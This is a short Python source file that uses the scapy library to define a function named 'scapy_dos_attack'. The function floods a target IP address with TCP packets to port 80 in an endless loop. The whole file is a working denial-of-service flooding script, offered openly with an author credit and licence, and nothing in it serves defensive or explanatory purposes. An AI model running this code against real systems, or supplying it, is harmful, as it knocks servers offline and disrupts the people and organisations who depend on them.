# Coded By : Khaled Nassar @knassar702
# Facebook & GITHUB : knassar702
# GPL-2.0
from scapy.all import *
def scapy_dos_attack(ip):
	while True:
		send(IP(dst=ip)/TCP(dport=80),count=5000)
